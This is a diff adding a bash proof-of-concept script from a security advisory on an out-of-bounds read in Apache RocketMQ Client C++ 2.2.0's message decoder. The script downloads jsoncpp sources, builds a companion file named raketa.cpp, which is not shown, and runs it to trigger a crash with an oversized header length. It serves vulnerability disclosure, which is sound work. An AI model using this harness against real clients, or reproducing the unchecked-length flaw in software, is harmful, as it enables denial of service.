@@ -1,0 +1,74 @@
+#!/usr/bin/env bash
+#
+#
+# Apache RocketMQ Client C++ 2.2.0 (RemotingCommand::Decode) Out-of-Bounds Read
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://rocketmq.apache.org
+# Affected version: 2.2.0
+#
+# Summary: RocketMQ-Client-CPP is the C/C++ client of Apache RocketMQ, a distributed
+# messaging and streaming platform with low latency, high performance and reliability,
+# trillion-level capacity and flexible scalability.
+#
+# Desc: Apache RocketMQ Client C++ suffers from a remote out-of-bounds read vulnerability
+# in its RemotingCommand decoder. The wire header length is used to compute a parse boundary
+# without validating it against the actual received buffer size, so a malicious or MitM broker
+# or nameserver can send a crafted frame that causes a large heap over-read. This allows a
+# peer to crash the client (DoS).
+#
+# Tested on: Microsoft Windows 10 (x86-64)
+#            jsoncpp 1.9.5
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6032
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6032
+#
+#
+# 13.08.2026
+#
+
+
+set -u
+HERE="$(cd "$(dirname "$0")" && pwd)"
+CXX="${CXX:-g++}"; command -v "$CXX" >/dev/null 2>&1 || CXX=c++
+command -v "$CXX" >/dev/null 2>&1 || { echo "[!] Need a C++ compiler (g++/c++)"; exit 1; }
+
+W="$HERE/rmq_poc_build"; rm -rf "$W"; mkdir -p "$W/src/json" "$W/include/json"
+JV="1.9.5"
+B="https://raw.githubusercontent.com/open-source-parsers/jsoncpp/$JV"
+echo "[*] Fetching real jsoncpp $JV sources ..."
+for h in json.h json-forwards.h config.h forwards.h json_features.h value.h reader.h writer.h \
+         assertions.h version.h allocator.h; do
+  curl -fsSL "$B/include/json/$h" -o "$W/include/json/$h" 2>/dev/null
+done
+for c in json_reader.cpp json_value.cpp json_writer.cpp; do
+  curl -fsSL "$B/src/lib_json/$c" -o "$W/src/$c" 2>/dev/null
+done
+curl -fsSL "$B/src/lib_json/json_tool.h" -o "$W/src/json_tool.h" 2>/dev/null
+curl -fsSL "$B/src/lib_json/json_valueiterator.inl" -o "$W/src/json_valueiterator.inl" 2>/dev/null
+[ -s "$W/src/json_reader.cpp" ] && [ -s "$W/include/json/json.h" ] || {
+  echo "[!] jsoncpp download failed"; exit 1; }
+
+echo "[*] Building raketa.cpp against the real jsoncpp Json::Reader ..."
+"$CXX" -std=c++11 -O0 -g -w -I"$W/include" -I"$W/src" \
+  "$HERE/raketa.cpp" "$W/src/json_reader.cpp" "$W/src/json_value.cpp" "$W/src/json_writer.cpp" \
+  -o "$W/raketa" || { echo "[!] Build failed"; exit 1; }
+
+echo "-----------------------------------------------------------------"
+echo "[*] Running: real Json::Reader::parse over an attacker headLen=0x7FFFFFFF range"
+echo "-----------------------------------------------------------------"
+"$W/raketa"; rc=$?
+echo "-----------------------------------------------------------------"
+if [ $rc -eq 0 ]; then
+  echo "[*] Parser returned without faulting on this run - re-run, or build with -fsanitize=address to"
+  echo "    see the heap-buffer-overflow report instead of relying on the guard page."
+else
+  printf "[+] Crashed (exit/signal %d) inside real jsoncpp parse -> remote OOB read confirmed (CWE-125).\n" "$rc"
+  echo "    POSIX: SIGSEGV (exit 139).  Windows: STATUS_ACCESS_VIOLATION 0xC0000005."
+fi
